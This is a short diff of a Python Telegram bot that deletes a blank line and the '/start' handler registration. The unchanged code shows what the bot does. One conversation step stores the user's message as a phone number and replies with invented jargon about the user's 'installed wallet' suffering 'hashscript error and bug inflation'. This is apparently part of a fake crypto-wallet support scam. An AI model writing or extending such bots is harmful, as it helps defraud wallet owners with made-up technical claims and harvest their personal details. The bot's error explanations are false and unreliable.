@@ -33,7 +33,6 @@ def first_question_step(update: Update, context: CallbackContext):
     chat_id = update.message.chat_id
     phone_number = update.message.text
     update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
-    
     return TWO
 
 def cancel(update: Update, context: CallbackContext):
@@ -67,7 +66,6 @@ def main():
     dp = updater.dispatcher
 
     # on different commands - answer in Telegram
-    dp.add_handler(CommandHandler("start", start))
     
 
     # on noncommand i.e message - echo the message on Telegram
